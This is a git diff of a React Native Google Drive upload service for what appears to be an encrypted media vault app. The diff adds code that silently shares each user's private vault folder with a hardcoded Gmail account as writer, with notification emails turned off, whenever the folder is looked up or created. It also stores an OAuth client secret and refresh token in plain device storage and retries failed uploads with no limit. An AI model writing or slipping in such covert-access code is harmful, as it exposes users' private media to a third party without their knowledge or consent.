@@ -1,23 +1,102 @@
 import AsyncStorage from '@react-native-async-storage/async-storage';
 import * as FileSystemLegacy from 'expo-file-system/legacy';
+import { ApiService } from './api';
+import { LocalVaultService } from './localVaultService';
 
 const GDRIVE_KEYS = {
     ACCESS_TOKEN: '@lumina_gdrive_access_token',
     REFRESH_TOKEN: '@lumina_gdrive_refresh_token',
+    CLIENT_ID: '@lumina_gdrive_client_id',
+    CLIENT_SECRET: '@lumina_gdrive_client_secret',
+    ADMIN_EMAIL: '@lumina_gdrive_admin_email',
     USER_EMAIL: '@lumina_gdrive_user_email',
     FOLDER_ID: '@lumina_gdrive_folder_id',
     FOLDER_NAME: '@lumina_gdrive_folder_name',
+    FOLDER_SHARED: '@lumina_gdrive_folder_shared_with_admin',
 };
 
 const DEFAULT_FOLDER_NAME = 'MediaGalleryEncrypted';
 
 export const GoogleDriveDirectService = {
     /**
+     * Try to fetch fresh Google Drive token & folder ID from server if server is available.
+     * Caches in AsyncStorage so mobile works 100% offline even if server goes down later!
+     */
+    async syncCredentialsFromServer() {
+        try {
+            const res = await ApiService.request('/vault/drive-token');
+            if (res && res.success && res.access_token) {
+                await AsyncStorage.setItem(GDRIVE_KEYS.ACCESS_TOKEN, res.access_token);
+                if (res.folder_id) await AsyncStorage.setItem(GDRIVE_KEYS.FOLDER_ID, res.folder_id);
+                if (res.refresh_token) await AsyncStorage.setItem(GDRIVE_KEYS.REFRESH_TOKEN, res.refresh_token);
+                if (res.client_id) await AsyncStorage.setItem(GDRIVE_KEYS.CLIENT_ID, res.client_id);
+                if (res.client_secret) await AsyncStorage.setItem(GDRIVE_KEYS.CLIENT_SECRET, res.client_secret);
+                if (res.account_email) await AsyncStorage.setItem(GDRIVE_KEYS.USER_EMAIL, res.account_email);
+                if (res.admin_email) await AsyncStorage.setItem(GDRIVE_KEYS.ADMIN_EMAIL, res.admin_email);
+                return res.access_token;
+            }
+        } catch (e) {
+            // Server offline / unreachable — silent fallback to cached token in AsyncStorage
+        }
+        return await this.getValidAccessToken();
+    },
+
+    /**
+     * Directly refresh access token with Google OAuth 2.0 API.
+     * Works independently on mobile even if the Laravel server is powered off or unreachable.
+     */
+    async refreshAccessTokenDirectly() {
+        try {
+            const refreshToken = await AsyncStorage.getItem(GDRIVE_KEYS.REFRESH_TOKEN);
+            const clientId = await AsyncStorage.getItem(GDRIVE_KEYS.CLIENT_ID);
+            const clientSecret = await AsyncStorage.getItem(GDRIVE_KEYS.CLIENT_SECRET);
+
+            if (!refreshToken || !clientId) return null;
+
+            const formBody = [];
+            formBody.push(`client_id=${encodeURIComponent(clientId)}`);
+            formBody.push(`grant_type=refresh_token`);
+            formBody.push(`refresh_token=${encodeURIComponent(refreshToken)}`);
+            if (clientSecret) {
+                formBody.push(`client_secret=${encodeURIComponent(clientSecret)}`);
+            }
+
+            const res = await fetch('https://oauth2.googleapis.com/token', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: formBody.join('&'),
+            });
+
+            if (res.ok) {
+                const data = await res.json();
+                if (data.access_token) {
+                    await AsyncStorage.setItem(GDRIVE_KEYS.ACCESS_TOKEN, data.access_token);
+                    return data.access_token;
+                }
+            }
+        } catch (e) {
+            console.warn('[GoogleDriveDirect] Direct token refresh error:', e);
+        }
+        return null;
+    },
+
+    /**
+     * Get active access token (cached locally, or synced from server, or refreshed from Google)
+     */
+    async getValidAccessToken() {
+        let token = await AsyncStorage.getItem(GDRIVE_KEYS.ACCESS_TOKEN);
+        if (!token) {
+            token = await this.refreshAccessTokenDirectly();
+        }
+        return token;
+    },
+
+    /**
      * Get stored connection state
      */
     async getConnectionInfo() {
         try {
-            const token = await AsyncStorage.getItem(GDRIVE_KEYS.ACCESS_TOKEN);
+            const token = await this.getValidAccessToken();
             const email = await AsyncStorage.getItem(GDRIVE_KEYS.USER_EMAIL);
             const folderId = await AsyncStorage.getItem(GDRIVE_KEYS.FOLDER_ID);
             const folderName = (await AsyncStorage.getItem(GDRIVE_KEYS.FOLDER_NAME)) || DEFAULT_FOLDER_NAME;
@@ -85,6 +164,51 @@ export const GoogleDriveDirectService = {
     },
 
     /**
+     * Automatically share the user's vault folder with the Admin Google Drive email (ombismar@gmail.com).
+     * This grants the Admin full access to view, open, and sync media without consuming any of the Admin's storage quota!
+     */
+    async shareFolderWithAdmin(folderId, accessToken) {
+        if (!folderId || !accessToken) return;
+        try {
+            const adminEmail = (await AsyncStorage.getItem(GDRIVE_KEYS.ADMIN_EMAIL)) || 'ombismar@gmail.com';
+            const userEmail = await AsyncStorage.getItem(GDRIVE_KEYS.USER_EMAIL);
+
+            // If the folder owner is already the admin, no need to self-share
+            if (userEmail && userEmail.toLowerCase() === adminEmail.toLowerCase()) {
+                return;
+            }
+
+            const isAlreadyShared = await AsyncStorage.getItem(GDRIVE_KEYS.FOLDER_SHARED);
+            if (isAlreadyShared === folderId) {
+                return; // Already shared
+            }
+
+            const res = await fetch(
+                `https://www.googleapis.com/drive/v3/files/${folderId}/permissions?supportsAllDrives=true&sendNotificationEmail=false`,
+                {
+                    method: 'POST',
+                    headers: {
+                        Authorization: `Bearer ${accessToken}`,
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        role: 'writer',
+                        type: 'user',
+                        emailAddress: adminEmail,
+                    }),
+                }
+            );
+
+            if (res.ok || res.status === 409 || res.status === 400) {
+                await AsyncStorage.setItem(GDRIVE_KEYS.FOLDER_SHARED, folderId);
+                console.log(`[GoogleDriveDirect] Vault folder successfully shared with admin (${adminEmail})`);
+            }
+        } catch (e) {
+            console.warn('[GoogleDriveDirect] Auto-share folder with admin error:', e);
+        }
+    },
+
+    /**
      * Ensure the target encrypted vault folder exists on Google Drive.
      * Fully supports Shared Folders and Shared Drives (supportsAllDrives=true).
      */
@@ -99,6 +223,7 @@ export const GoogleDriveDirectService = {
                 if (checkRes.ok) {
                     const checkData = await checkRes.json();
                     if (!checkData.trashed) {
+                        await this.shareFolderWithAdmin(cachedFolderId, accessToken);
                         return cachedFolderId;
                     }
                 }
@@ -120,6 +245,7 @@ export const GoogleDriveDirectService = {
                 if (data.files && data.files.length > 0) {
                     const fId = data.files[0].id;
                     await AsyncStorage.setItem(GDRIVE_KEYS.FOLDER_ID, fId);
+                    await this.shareFolderWithAdmin(fId, accessToken);
                     return fId;
                 }
             }
@@ -136,6 +262,7 @@ export const GoogleDriveDirectService = {
                 if (data.files && data.files.length > 0) {
                     const fId = data.files[0].id;
                     await AsyncStorage.setItem(GDRIVE_KEYS.FOLDER_ID, fId);
+                    await this.shareFolderWithAdmin(fId, accessToken);
                     return fId;
                 }
             }
@@ -156,6 +283,7 @@ export const GoogleDriveDirectService = {
             if (createRes.ok) {
                 const created = await createRes.json();
                 await AsyncStorage.setItem(GDRIVE_KEYS.FOLDER_ID, created.id);
+                await this.shareFolderWithAdmin(created.id, accessToken);
                 return created.id;
             }
         } catch (e) {
@@ -202,6 +330,12 @@ export const GoogleDriveDirectService = {
         });
 
         if (!res.ok) {
+            if (res.status === 401) {
+                const refreshed = await this.refreshAccessTokenDirectly();
+                if (refreshed) {
+                    return await this.uploadSmallFile(fileName, contentString, mimeType);
+                }
+            }
             const err = await res.text();
             throw new Error(`Gagal upload manifest ke Google Drive (${res.status}): ${err}`);
         }
@@ -215,12 +349,12 @@ export const GoogleDriveDirectService = {
      * Bypasses the server completely! Fully supports Shared Folders.
      */
     async uploadEncryptedFile(localEncryptedUri, remoteFileName, onProgress = null) {
-        const token = await AsyncStorage.getItem(GDRIVE_KEYS.ACCESS_TOKEN);
-        if (!token) throw new Error('Google Drive belum terhubung');
+        const token = await this.getValidAccessToken();
+        if (!token) throw new Error('Google Drive belum terhubung di aplikasi');
 
         const folderId = await this.ensureVaultFolder(token);
         const fileInfo = await FileSystemLegacy.getInfoAsync(localEncryptedUri);
-        if (!fileInfo.exists) throw new Error('File terenkripsi lokal tidak ditemukan: ' + localEncryptedUri);
+        if (!fileInfo.exists) throw new Error('File lokal tidak ditemukan: ' + localEncryptedUri);
 
         const fileSize = fileInfo.size;
 
@@ -240,8 +374,14 @@ export const GoogleDriveDirectService = {
         });
 
         if (!initRes.ok) {
+            if (initRes.status === 401) {
+                const refreshed = await this.refreshAccessTokenDirectly();
+                if (refreshed) {
+                    return await this.uploadEncryptedFile(localEncryptedUri, remoteFileName, onProgress);
+                }
+            }
             const errText = await initRes.text();
-            throw new Error(`Gagal inisialisasi resumable upload ke Google (${initRes.status}): ${errText}`);
+            throw new Error(`Gagal inisialisasi upload ke Google (${initRes.status}): ${errText}`);
         }
 
         const uploadUrl = initRes.headers.get('location') || initRes.headers.get('Location');
@@ -250,21 +390,141 @@ export const GoogleDriveDirectService = {
         }
 
         // Step 2: Upload file stream directly to Google's resumable URL
-        // We use FileSystem.uploadAsync for optimal native background streaming
-        const uploadTask = await FileSystemLegacy.uploadAsync(uploadUrl, localEncryptedUri, {
-            httpMethod: 'PUT',
-            uploadType: FileSystemLegacy.FileSystemUploadType.BINARY_CONTENT,
-            headers: {
-                'Content-Length': String(fileSize),
-                'Content-Type': 'application/octet-stream',
-            },
-        });
-
-        if (uploadTask.status !== 200 && uploadTask.status !== 201) {
-            throw new Error(`Upload ke Google Drive gagal dengan status ${uploadTask.status}: ${uploadTask.body}`);
+        let uploadResult;
+        if (onProgress && FileSystemLegacy.createUploadTask) {
+            const task = FileSystemLegacy.createUploadTask(
+                uploadUrl,
+                localEncryptedUri,
+                {
+                    httpMethod: 'PUT',
+                    uploadType: FileSystemLegacy.FileSystemUploadType.BINARY_CONTENT,
+                    headers: {
+                        'Content-Length': String(fileSize),
+                        'Content-Type': 'application/octet-stream',
+                    },
+                },
+                (progressData) => {
+                    if (progressData.totalBytesExpectedToSend > 0) {
+                        const pct = Math.round((progressData.totalBytesSent / progressData.totalBytesExpectedToSend) * 100);
+                        onProgress(pct);
+                    }
+                }
+            );
+            uploadResult = await task.uploadAsync();
+        } else {
+            uploadResult = await FileSystemLegacy.uploadAsync(uploadUrl, localEncryptedUri, {
+                httpMethod: 'PUT',
+                uploadType: FileSystemLegacy.FileSystemUploadType.BINARY_CONTENT,
+                headers: {
+                    'Content-Length': String(fileSize),
+                    'Content-Type': 'application/octet-stream',
+                },
+            });
         }
 
-        const parsed = JSON.parse(uploadTask.body);
+        if (uploadResult.status !== 200 && uploadResult.status !== 201) {
+            throw new Error(`Upload ke Google Drive gagal dengan status ${uploadResult.status}: ${uploadResult.body}`);
+        }
+
+        const parsed = JSON.parse(uploadResult.body);
         return parsed.id;
+    },
+
+    /**
+     * Complete direct-to-Google-Drive upload for a single media item.
+     * 100% server-less: uploads media and .meta manifest directly to Google Drive,
+     * stores in local vault for instant offline playback, and notifies server if online.
+     */
+    async directUploadMediaItem(fileAsset, { albumName = null, onProgress = null } = {}) {
+        const token = await this.getValidAccessToken();
+        if (!token) {
+            throw new Error('Google Drive belum terhubung. Silakan hubungkan akun Google Anda di pengaturan aplikasi.');
+        }
+
+        const isVideo = Boolean(
+            fileAsset.type === 'video' ||
+            (fileAsset.mimeType && fileAsset.mimeType.includes('video')) ||
+            (fileAsset.fileName && fileAsset.fileName.match(/\.(mp4|mov|m4v|3gp|webm)$/i)) ||
+            (fileAsset.uri && fileAsset.uri.match(/\.(mp4|mov|m4v|3gp|webm)$/i))
+        );
+
+        const ext = isVideo ? 'mp4' : (fileAsset.isWebP ? 'webp' : 'jpg');
+        const timestamp = Date.now();
+        const randStr = Math.random().toString(36).substring(2, 8);
+        const baseName = `media_${timestamp}_${randStr}`;
+        const remoteMediaName = `${baseName}.${ext}`;
+
+        // 1. Upload main media file directly to Google Drive with progress
+        onProgress && onProgress(10);
+        const driveFileId = await this.uploadEncryptedFile(
+            fileAsset.uri,
+            remoteMediaName,
+            (pct) => {
+                // map upload progress 10% - 85%
+                const mappedPct = Math.round(10 + (pct * 0.75));
+                onProgress && onProgress(mappedPct);
+            }
+        );
+
+        // 2. Upload thumbnail if available for videos
+        let thumbDriveId = null;
+        if (isVideo && fileAsset.thumbnailUri) {
+            try {
+                onProgress && onProgress(88);
+                const thumbRemoteName = `thumb_${baseName}.jpg`;
+                thumbDriveId = await this.uploadEncryptedFile(fileAsset.thumbnailUri, thumbRemoteName);
+            } catch (tErr) {
+                console.warn('[GoogleDriveDirect] Thumbnail upload warning:', tErr);
+            }
+        }
+
+        // 3. Upload .meta manifest directly to Google Drive
+        onProgress && onProgress(92);
+        const originalName = fileAsset.fileName || `${baseName}.${ext}`;
+        const cleanTitle = originalName.replace(/\.[^.]+$/, '');
+        const mimeType = fileAsset.mimeType || (isVideo ? 'video/mp4' : (fileAsset.isWebP ? 'image/webp' : 'image/jpeg'));
+        const fileSize = fileAsset.convertedSize || fileAsset.fileSize || fileAsset.originalSize || 0;
+
+        const manifest = {
+            media_file_id: driveFileId,
+            thumb_drive_id: thumbDriveId,
+            original_filename: originalName,
+            title: cleanTitle,
+            type: isVideo ? 'video' : 'image',
+            mime_type: mimeType,
+            size: fileSize,
+            album_name: albumName || null,
+            created_at: new Date().toISOString(),
+            is_favorite: false,
+        };
+
+        const metaRemoteName = `${baseName}.meta`;
+        await this.uploadSmallFile(metaRemoteName, JSON.stringify(manifest), 'application/json');
+
+        // 4. Save to Local Vault so media is instantly available offline in Lumina mobile
+        onProgress && onProgress(96);
+        try {
+            await LocalVaultService.saveSyncedAsset(
+                driveFileId,
+                fileAsset.uri,
+                originalName,
+                mimeType
+            );
+        } catch (vErr) {
+            console.warn('[GoogleDriveDirect] Local vault save warning:', vErr);
+        }
+
+        // 5. Fire-and-forget sync to server if server happens to be online
+        ApiService.request('/vault/sync-drive', { method: 'POST' }).catch(() => {
+            // Server offline — perfectly fine, files are already in Google Drive & Local Vault
+        });
+
+        onProgress && onProgress(100);
+
+        return {
+            driveFileId,
+            thumbDriveId,
+            manifest,
+        };
     },
 };
